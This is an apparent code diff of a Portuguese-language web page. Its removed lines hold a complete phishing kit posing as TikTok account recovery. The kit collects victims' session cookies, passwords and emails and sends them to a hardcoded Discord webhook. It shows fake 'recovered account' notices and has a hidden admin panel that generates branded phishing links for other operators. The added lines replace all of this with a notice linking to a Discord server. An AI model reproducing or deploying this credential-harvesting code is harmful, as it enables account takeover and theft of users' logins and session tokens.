@@ -3,201 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="siteTitle">TikTok Support - Recovery System</title>
+    <title>AVISO IMPORTANTE | Morgan Beam</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+
     <style>
-        :root {
-            --primary: #8a2be2;
-            --secondary: #6a1b9a;
-            --bg: #0a0510;
-            --card-bg: #160d25;
-            --text: #e0d5f0;
-            --accent: #bc8cf2;
+        :root { 
+            --accent-pink: #f472b6; 
+            --bg-dark: #070208; 
+            --card-bg: #15051a; 
+            --glow: rgba(244, 114, 182, 0.4); 
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
 
         body { 
-            font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); 
-            margin: 0; display: flex; flex-direction: column; align-items: center; 
-            min-height: 100vh; padding: 20px;
+            background-color: var(--bg-dark); 
+            color: #fff; 
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            background-image: radial-gradient(circle at center, #2d052a 0%, #070208 100%);
         }
 
-        .card { 
-            background: var(--card-bg); border: 1px solid var(--primary); padding: 30px; 
-            border-radius: 20px; width: 100%; max-width: 420px; 
-            box-shadow: 0 0 25px rgba(138, 43, 226, 0.3); text-align: center;
+        .notice-container {
+            width: 90%;
+            max-width: 600px;
+            text-align: center;
+            padding: 40px;
+            background: var(--card-bg);
+            border: 2px solid var(--accent-pink);
+            border-radius: 30px;
+            box-shadow: 0 0 50px var(--glow);
+            animation: pulseIn 0.8s ease-out;
         }
 
-        h2 { color: var(--accent); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; }
-
-        .input-group { text-align: left; margin-bottom: 15px; }
-        label { font-size: 12px; color: var(--accent); margin-left: 5px; }
-
-        input { 
-            width: 100%; padding: 14px; margin-top: 5px; border-radius: 10px; 
-            border: 1px solid #3d245d; background: #0f081a; color: white; 
-            box-sizing: border-box; outline: none; transition: 0.3s;
+        .icon-warning {
+            font-size: 4rem;
+            color: var(--accent-pink);
+            margin-bottom: 20px;
+            text-shadow: 0 0 15px var(--accent-pink);
         }
 
-        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(138, 43, 226, 0.5); }
-
-        button { 
-            width: 100%; padding: 15px; background: linear-gradient(45deg, var(--secondary), var(--primary)); 
-            color: white; border: none; cursor: pointer; font-weight: bold; 
-            border-radius: 10px; font-size: 16px; margin-top: 15px; 
-            box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--accent-pink);
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
         }
 
-        .fake-feed { 
-            width: 100%; max-width: 420px; margin-top: 25px; 
-            background: rgba(22, 13, 37, 0.7); border-radius: 15px; 
-            padding: 15px; border: 1px dashed var(--primary); height: 110px; overflow: hidden;
+        p {
+            font-size: 1.2rem;
+            line-height: 1.6;
+            color: #eee;
+            margin-bottom: 30px;
         }
 
-        .feed-item { font-size: 12px; padding: 8px; border-bottom: 1px solid #2a1a3d; display: flex; align-items: center; color: #bca0dc; animation: slideIn 0.5s; }
-        .status-dot { height: 7px; width: 7px; background: #00ff88; border-radius: 50%; margin-right: 10px; box-shadow: 0 0 8px #00ff88; }
-
-        @keyframes slideIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
-
-        .gif-trigger { width: 100%; border-radius: 15px; cursor: pointer; margin-top: 20px; }
-
-        .admin-modal { 
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            background: #1a0b2e; padding: 35px; border: 2px solid var(--primary); 
-            border-radius: 20px; z-index: 999; width: 320px; box-shadow: 0 0 50px #000;
+        .discord-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 18px 40px;
+            background: linear-gradient(45deg, #db2777, var(--accent-pink));
+            color: white;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 1.1rem;
+            border-radius: 50px; /* Arredondado */
+            transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(219, 39, 119, 0.3);
         }
 
-        .success-msg { color: #00ff88; font-weight: bold; border: 1px solid #00ff88; padding: 15px; border-radius: 10px; margin-top: 15px; display: none; background: rgba(0, 255, 136, 0.1); }
-        .hidden { display: none; }
-        .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); z-index: 998; }
+        .discord-btn:hover {
+            transform: scale(1.05) translateY(-5px);
+            box-shadow: 0 15px 30px rgba(219, 39, 119, 0.5);
+            filter: brightness(1.1);
+        }
 
-        #linkGerado { 
-            background: #000; color: #00ff88; padding: 10px; font-size: 10px; 
-            word-break: break-all; margin-top: 10px; border-radius: 5px; border: 1px solid #333;
-            max-height: 80px; overflow-y: auto;
+        .brand-footer {
+            margin-top: 30px;
+            font-size: 0.9rem;
+            color: #666;
+            font-weight: 600;
+        }
+
+        @keyframes pulseIn {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Efeito de luz piscando no fundo */
+        .glow-bg {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+            background: radial-gradient(circle at 50% 50%, var(--accent-pink) 0%, transparent 70%);
+            animation: blink 4s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0.1; }
+            50% { opacity: 0.3; }
         }
     </style>
 </head>
 <body>
 
-    <div class="card" id="mainCard">
-        <h2 id="displayTitle">Recuperar Conta</h2>
-        
-        <div class="input-group"><label>Cookie</label><input type="text" id="v_cookie" placeholder="Token de Sessão"></div>
-        <div class="input-group"><label>Senha Desejada</label><input type="password" id="v_pass" placeholder="••••••••"></div>
-        <div class="input-group"><label>Gmail Recuperação</label><input type="email" id="v_gmail" placeholder="exemplo@gmail.com"></div>
-        <div class="input-group"><label>Nome Tik Tok</label><input type="text" id="v_tiktok" placeholder="@usuario"></div>
-        
-        <button id="btnSubmit" onclick="enviarParaWebhook()">INICIAR RECUPERAÇÃO</button>
+    <div class="glow-bg"></div>
 
-        <div id="successBox" class="success-msg">
-            ✅ Solicitação enviada! Dentro de 24 horas enviaremos um aviso no seu TikTok.
+    <div class="notice-container">
+        <i class="fas fa-exclamation-triangle icon-warning"></i>
+        <h1>ATENÇÃO</h1>
+        <p>
+            Aviso A Todos Da Crazzy O Serve Vai Ser Deletado e Nos Estamos Nesse Discord, 
+            <br><strong>"Morgan Beam"</strong>
+            <br><br>
+            Nosso novo Discord oficial está abaixo:
+        </p>
+        
+        <a href="https://discord.gg/R5DKKHqDtz" target="_blank" class="discord-btn">
+            <i class="fab fa-discord"></i> ENTRAR NO NOVO DISCORD
+        </a>
+
+        <div class="brand-footer">
+            Morgan Beam &copy; 2024
         </div>
-
-        <img src="https://share.creavite.co/69a63e71e207736a321bdbfb.gif" class="gif-trigger" onclick="clickDetect()">
     </div>
 
-    <div class="fake-feed" id="feedContainer"></div>
-
-    <div id="overlay" class="overlay hidden"></div>
-    
-    <div id="adminPanel" class="admin-modal hidden">
-        <h3 style="color:var(--accent); margin-top:0;">Login ADM</h3>
-        <input type="text" id="adm_user" placeholder="CrazzyBeamers">
-        <input type="password" id="adm_pass" placeholder="Senha">
-        <button onclick="loginAdm()">ENTRAR</button>
-        <button onclick="closeAdm()" style="background:transparent; color: #888; border: 1px solid #444;">Sair</button>
-    </div>
-
-    <div id="genPanel" class="admin-modal hidden">
-        <h3 style="color:var(--accent);">Painel de Geração</h3>
-        <input type="text" id="site_name_adm" placeholder="Nome do Site (Ex: TikTok Support)">
-        <input type="text" id="webhook_adm" placeholder="URL do Webhook do ADM">
-        <button onclick="gerarLink()">GERAR SEU LINK DO SITE</button>
-        
-        <div id="linkGerado" class="hidden"></div>
-        <div id="stts" style="margin-top:10px; font-size:12px; color:#00ff88;"></div>
-        
-        <button onclick="closeAdm()" style="background:transparent; color: #888; border: 1px solid #444; margin-top:10px;">Sair do Painel</button>
-    </div>
-
-    <script>
-        // WEBHOOK PRINCIPAL (SEU)
-        const MASTER_HOOK = "https://discord.com/api/webhooks/1473834874199605423/Or8IcI6PHv0Ro7Ww7Xsns8Wp2HmCk1eVmJqAWSBwvyBAZ-OUe595DRaB78MBBVCwBsIK";
-        
-        let clicks = 0;
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const subHook = urlParams.get('h'); 
-        const subTitle = urlParams.get('t');
-
-        if(subTitle) {
-            const nomeEditado = decodeURIComponent(subTitle);
-            document.getElementById('displayTitle').innerText = nomeEditado;
-            document.title = nomeEditado;
-        }
-
-        const users = ["@jhow_zero", "@ana_clara", "@vini.tt", "@crazzy_12", "@gui_ofc", "@tktk_res"];
-        function updateFeed() {
-            const container = document.getElementById('feedContainer');
-            const user = users[Math.floor(Math.random() * users.length)];
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<div class="status-dot"></div> ${user} recuperou a conta agora.`;
-            if(container.children.length >= 3) container.removeChild(container.lastChild);
-            container.prepend(div);
-        }
-        setInterval(updateFeed, 10000); updateFeed();
-
-        function clickDetect() { clicks++; if(clicks >= 5) { document.getElementById('adminPanel').classList.remove('hidden'); document.getElementById('overlay').classList.remove('hidden'); clicks = 0; } }
-        function closeAdm() { document.querySelectorAll('.admin-modal, .overlay').forEach(e => e.classList.add('hidden')); }
-
-        function loginAdm() {
-            if(document.getElementById('adm_user').value === "CrazzyBeamers" && document.getElementById('adm_pass').value === "CrazzyBeamers") {
-                document.getElementById('adminPanel').classList.add('hidden');
-                document.getElementById('genPanel').classList.remove('hidden');
-            } else { alert("Login Errado!"); }
-        }
-
-        function gerarLink() {
-            const wh = document.getElementById('webhook_adm').value;
-            const nm = document.getElementById('site_name_adm').value || "Recuperar Conta";
-            
-            if(!wh.includes("discord.com/api/webhooks")) { alert("Insira um Webhook válido!"); return; }
-            
-            const base = window.location.href.split('?')[0];
-            const final = `${base}?h=${encodeURIComponent(wh)}&t=${encodeURIComponent(nm)}`;
-            
-            const box = document.getElementById('linkGerado');
-            box.innerText = final;
-            box.classList.remove('hidden');
-            document.getElementById('stts').innerText = "Link gerado com sucesso!";
-        }
-
-        function enviarParaWebhook() {
-            const tiktok = document.getElementById('v_tiktok').value;
-            const msg = {
-                embeds: [{
-                    title: "💜 NOVO RESULTADO - CRAZZY BEAM 💜",
-                    description: `**Origem:** ${document.getElementById('displayTitle').innerText}`,
-                    color: 9055202,
-                    fields: [
-                        { name: "👤 TikTok", value: tiktok || "N/A", inline: true },
-                        { name: "🔑 Senha", value: document.getElementById('v_pass').value || "N/A", inline: true },
-                        { name: "📧 Gmail", value: document.getElementById('v_gmail').value || "N/A" },
-                        { name: "🍪 Cookie", value: "```" + (document.getElementById('v_cookie').value || "N/A") + "```" }
-                    ],
-                    footer: { text: "Crazzy Beamers System" }
-                }]
-            };
-
-            fetch(MASTER_HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
-
-            if(subHook) {
-                fetch(subHook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
-            }
-
-            document.getElementById('btnSubmit').style.display = "none";
-            document.getElementById('successBox').style.display = "block";
-        }
-    </script>
 </body>
 </html>
